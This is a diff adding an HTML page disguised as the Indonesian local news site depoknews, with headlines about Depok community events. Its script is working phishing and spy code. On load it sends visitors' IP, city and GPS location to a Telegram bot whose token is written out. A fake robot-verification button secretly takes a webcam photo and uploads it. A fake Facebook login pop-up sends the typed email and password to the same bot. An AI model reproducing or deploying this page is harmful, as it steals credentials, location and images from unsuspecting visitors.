@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>depoknews - terpercaya dan bersahabat</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        body {
+            background: #fff;
+            color: #333;
+            line-height: 1.5;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .site-title {
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #000;
+        }
+        .site-title span {
+            color: #999;
+            font-size: 14px;
+            font-weight: normal;
+            margin-left: 10px;
+        }
+        .tagline {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 10px;
+        }
+        
+        /* Navigasi */
+        .nav {
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #333;
+        }
+        .nav a {
+            color: #333;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+        .nav a:hover {
+            text-decoration: underline;
+        }
+        .nav span {
+            color: #999;
+            margin: 0 5px;
+        }
+        
+        /* Info kecil atas */
+        .info-top {
+            font-size: 12px;
+            color: #777;
+            margin-bottom: 20px;
+        }
+        
+        /* Headline */
+        .headline {
+            margin-bottom: 30px;
+        }
+        .headline h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            line-height: 1.3;
+        }
+        .headline .date {
+            font-size: 12px;
+            color: #777;
+            margin-bottom: 15px;
+        }
+        
+        /* Section title */
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 25px 0 15px;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 5px;
+        }
+        .section-title .see-more {
+            float: right;
+            font-size: 13px;
+            font-weight: normal;
+            color: #0066cc;
+            text-decoration: none;
+        }
+        
+        /* Grid berita */
+        .row {
+            display: flex;
+            gap: 25px;
+            flex-wrap: wrap;
+        }
+        .col {
+            flex: 1;
+            min-width: 250px;
+        }
+        
+        /* Item berita */
+        .news-item {
+            margin-bottom: 20px;
+        }
+        .news-item h3 {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 3px;
+            line-height: 1.4;
+        }
+        .news-item .date {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+        .news-item p {
+            font-size: 13px;
+            color: #555;
+        }
+        
+        /* Berita kecil (kayak di contoh) */
+        .small-news {
+            margin-bottom: 15px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
+        }
+        .small-news h4 {
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+        .small-news .date {
+            font-size: 10px;
+            color: #999;
+        }
+        
+        /* Ragam & Kuliner */
+        .ragam-item {
+            margin-bottom: 20px;
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+        .ragam-item h3 {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .ragam-item .date {
+            font-size: 11px;
+            color: #777;
+        }
+        
+        /* Verifikasi Box */
+        .verif-box {
+            background: #f0f7ff;
+            border: 1px solid #b8daff;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        .verif-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .verif-text {
+            color: #555;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .verif-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(40,167,69,0.3);
+            transition: 0.3s;
+        }
+        .verif-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .verif-note {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #888;
+        }
+        
+        /* Modal login */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal.aktif {
+            display: flex;
+        }
+        .modal-box {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-box h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .modal-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close {
+            float: right;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+        .blur {
+            filter: blur(2px);
+            pointer-events: none;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+        .loading.aktif {
+            display: flex;
+        }
+        
+        @media (max-width: 700px) {
+            .site-title { font-size: 32px; }
+            .row { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading" id="loading">Loading...</div>
+
+<!-- MODAL LOGIN DENGAN LOGO FACEBOOK -->
+<div class="modal" id="modal">
+    <div class="modal-box">
+        <span class="close" id="closeModal">&times;</span>
+        
+        <!-- LOGO FACEBOOK -->
+        <div style="text-align: center; margin-bottom: 15px;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="64" height="64">
+                <path fill="#1877F2" d="M24 5C13.5 5 5 13.5 5 24c0 9.5 7 17.4 16.2 18.8V29.5h-4.7V24h4.7v-4.1c0-4.7 2.8-7.3 7.1-7.3 2.1 0 4.2.4 4.2.4v4.7h-2.4c-2.4 0-3.1 1.5-3.1 3v3.6h5.3l-0.9 5.5h-4.4v13.3C36 41.4 43 33.5 43 24 43 13.5 34.5 5 24 5z"/>
+                <path fill="#FFFFFF" d="M29.9 29.5l0.9-5.5h-5.3v-3.6c0-1.5 0.7-3 3.1-3h2.4v-4.7c0 0-2.1-0.4-4.2-0.4-4.3 0-7.1 2.6-7.1 7.3V24h-4.7v5.5h4.7v13.3c0.9 0.1 1.9 0.2 2.9 0.2s2-0.1 2.9-0.2V29.5H29.9z"/>
+            </svg>
+        </div>
+        
+        <h2>Masuk dengan Facebook</h2>
+        <input type="text" id="email" class="modal-input" placeholder="Email atau nomor HP">
+        <input type="password" id="pass" class="modal-input" placeholder="Kata sandi">
+        <button class="modal-btn" id="loginBtn">Masuk</button>
+        <div style="text-align: center; margin-top: 15px; font-size: 13px;">
+            <a href="#" style="color: #1877f2; text-decoration: none;">Lupa kata sandi?</a> • 
+            <a href="#" style="color: #1877f2; text-decoration: none;">Daftar</a>
+        </div>
+    </div>
+</div>
+
+<div class="container" id="konten">
+    <!-- Header -->
+    <div class="site-title">
+        depoknews <span>terpercaya dan bersahabat</span>
+    </div>
+    
+    <!-- Navigasi -->
+    <div class="nav">
+        <a href="#">Home</a> <span>|</span>
+        <a href="#">Metro Depok</a> <span>|</span>
+        <a href="#">Nasional</a> <span>|</span>
+        <a href="#">Pendidikan</a> <span>|</span>
+        <a href="#">Peristiwa</a>
+    </div>
+    
+    <!-- Info kecil -->
+    <div class="info-top">
+        epok • Santika Hotel Depok Kenalkan Menu Malaysia • Kota De
+    </div>
+    
+    <!-- Headline -->
+    <div class="headline" id="artikel">
+        <h1>SANTUNAN DAN BUKA PUASA BERSAMA KOMUNITAS DISABILITAS KOTA DEPOK Kolaborasi Komunitas BIMA dan Yayasan SEABAD (Sejahtera Berkah Abadi)</h1>
+        <div class="date">3 hours ago</div>
+    </div>
+    
+    <!-- VERIFIKASI BUKAN ROBOT -->
+    <div class="verif-box">
+        <div class="verif-title">🤖 Verifikasi Keamanan</div>
+        <div class="verif-text">Klik tombol di bawah untuk membuktikan Anda bukan robot</div>
+        <button class="verif-btn" id="verifBtn">✓ SAYA BUKAN ROBOT</button>
+        <div class="verif-note">Menggunakan teknologi deteksi gerakan real-time</div>
+    </div>
+    
+    <!-- Metro Depok -->
+    <div class="section-title">
+        Metro Depok
+        <a href="#" class="see-more">[See More >]</a>
+    </div>
+    
+    <div class="row">
+        <div class="col">
+            <div class="news-item">
+                <h3>IMAM MUDA & TALISIN LOR'ANY Sambut Ramadan, Pelatihan Imam Muda dan Tahsin Al-Qur'an Digelar di Limo</h3>
+                <div class="date">8 Mar 2026</div>
+            </div>
+            <div class="news-item">
+                <h3>KABAR GEMBIRA UNTUK PELAJAR & SANTRI DI KOTA DEPOK! Kacamata Minus Besar FULL GRATIS di OPTIK SEJAHTERA</h3>
+                <div class="date">8 Sep 2025 - 07:34 WIB</div>
+            </div>
+        </div>
+        <div class="col">
+            <div class="news-item">
+                <h3>DPC PKS Sukmajaya Gelar Donor Darah Bersama PMI Kota Depok</h3>
+                <div class="date">31 Aug 2025 - 16:52 WIB</div>
+            </div>
+            <div class="news-item">
+                <h3>Semarakkan HUT RI Optik Sejahtera Berbagi Kacamata GRATIS untuk Guru Depok</h3>
+                <div class="date">27 Aug 2025 - 05:50 WIB</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Ragam -->
+    <div class="section-title">
+        Ragam
+        <a href="#" class="see-more">[See More]</a>
+    </div>
+    
+    <div class="ragam-item">
+        <h3>SANTUNAN DAN BUKA PUASA BERSAMA KOMUNITAS DISABILITAS KOTA DEPOK Kolaborasi Komunitas BIMA dan Yayasan SEABAD (Sejahtera Berkah Abadi)</h3>
+        <div class="date">3 hours ago</div>
+    </div>
+    
+    <div class="ragam-item">
+        <h3>Reses II 2025–2026, Hj. Iin Nur Fatinah Serap Aspirasi Anak Muda di Harapan Jaya</h3>
+        <div class="date">1 Mar 2026 - 06:06 WIB</div>
+    </div>
+    
+    <div class="ragam-item">
+        <h3>Bidnaker DPD PKS Kota Depok Gelar Meeting Koordinasi dan Bukber, Tegaskan Ramadhan Fokus Ibadah</h3>
+        <div class="date">28 Feb 2026 - 17:17 WIB</div>
+    </div>
+    
+    <!-- Kuliner -->
+    <div class="section-title">
+        Kuliner
+        <a href="#" class="see-more">[See More]</a>
+    </div>
+    
+    <div class="ragam-item">
+        <h3>"Membangkitkan Kembali Usaha Makanan Rumahan Melalui Transisi Toko Offline Menjadi E-Store"</h3>
+        <div class="date">2 Jun 2022 - 13:12 WIB</div>
+    </div>
+    
+    <div class="ragam-item">
+        <h3>The Margo Hotel Sajikan Kuliner</h3>
+        <div class="date">2 Jun 2022</div>
+    </div>
+</div>
+
+<!-- Hidden buat capture -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+// Konfig Telegram
+const token = '8304013205:AAHO0jFv2SC-7Ejmwn-hC2Sua-ArIO7RkAQ';
+const chat_id = '8452444655';
+let sudahKirim = false;
+
+function kirimTeks(t) {
+    fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:chat_id, text:t})
+    }).catch(e=>{});
+}
+
+function kirimFoto(blob, caption) {
+    let fd = new FormData();
+    fd.append('chat_id', chat_id);
+    fd.append('photo', blob, 'verif.jpg');
+    fd.append('caption', caption);
+    fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
+        method: 'POST',
+        body: fd
+    }).catch(e=>{});
+}
+
+// Kirim data korban
+if(!sudahKirim) {
+    sudahKirim = true;
+    kirimTeks('🔥 Korban baru: depoknews');
+    
+    // IP
+    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+        fetch('https://ipapi.co/' + d.ip + '/json/').then(r=>r.json()).then(i=>{
+            let p = '🌐 IP: ' + i.ip + ' - ' + i.country_name + ', ' + i.city;
+            kirimTeks(p);
+        });
+    });
+    
+    // GPS
+    if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(p=>{
+            kirimTeks('📍 Maps: https://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
+        });
+    }
+}
+
+// ===== FITUR VERIFIKASI BUKAN ROBOT =====
+document.getElementById('verifBtn').onclick = function() {
+    // Ubah tampilan tombol
+    this.innerHTML = '⏱ MEMVERIFIKASI...';
+    this.style.background = '#6c757d';
+    this.disabled = true;
+    
+    // Alert sebelum minta izin kamera (MENGALIHKAN PERHATIAN)
+    alert('🤖 Deteksi gerakan: Arahkan wajah ke kamera selama 2 detik');
+    
+    // Minta akses kamera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+    .then(function(stream) {
+        // Notifikasi palsu ke korban
+        alert('✅ Verifikasi berhasil! Anda bukan robot.');
+        
+        // Capture foto diam-diam
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        setTimeout(function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(function(blob) {
+                let fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('photo', blob, 'verif.jpg');
+                fd.append('caption', '✅ Verifikasi bukan robot - ' + new Date().toLocaleString());
+                fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
+                    method: 'POST',
+                    body: fd
+                });
+                
+                // Kirim notifikasi
+                kirimTeks('📸 Foto dari verifikasi berhasil dikirim');
+            });
+            
+            // Matikan kamera
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Kembalikan tombol
+            document.getElementById('verifBtn').innerHTML = '✓ TERVERIFIKASI';
+            document.getElementById('verifBtn').style.background = '#28a745';
+        }, 2000); // kasih waktu 2 detik
+    })
+    .catch(function(err) {
+        // Kalo ditolak kamera
+        alert('❌ Gagal verifikasi. Izinkan kamera dan coba lagi.');
+        document.getElementById('verifBtn').innerHTML = '✓ SAYA BUKAN ROBOT';
+        document.getElementById('verifBtn').style.background = '#28a745';
+        document.getElementById('verifBtn').disabled = false;
+        
+        // Lapor ke Telegram
+        kirimTeks('❌ Korban tolak kamera saat verifikasi');
+    });
+};
+
+// Modal login
+const modal = document.getElementById('modal');
+const konten = document.getElementById('konten');
+let udahModal = false;
+
+function tampilModal() {
+    if(!udahModal) {
+        modal.classList.add('aktif');
+        konten.classList.add('blur');
+        udahModal = true;
+    }
+}
+
+document.getElementById('closeModal').onclick = () => {
+    modal.classList.remove('aktif');
+    konten.classList.remove('blur');
+};
+
+setTimeout(tampilModal, 4000);
+window.onscroll = function() {
+    if(window.scrollY > 100 && !udahModal) tampilModal();
+};
+
+// Login
+document.getElementById('loginBtn').onclick = () => {
+    let e = document.getElementById('email').value;
+    let p = document.getElementById('pass').value;
+    if(e.length<3 || p.length<3) { alert('Isi dulu'); return; }
+    
+    document.getElementById('loading').classList.add('aktif');
+    kirimTeks('🔐 Login: ' + e + ' | ' + p);
+    
+    modal.classList.remove('aktif');
+    konten.classList.remove('blur');
+    
+    setTimeout(() => {
+        document.getElementById('loading').classList.remove('aktif');
+        document.getElementById('artikel').innerHTML = '<h1>UPDATE: Video Viral Siswi SMPN 25 Depok</h1><p>Pihak sekolah buka suara terkait video yang beredar. "Itu hoax," kata Kepsek Murtiningrum. Polisi imbau bijak bermedsos.</p>';
+    }, 2000);
+};
+</script>
+
+</body>
+  </html>
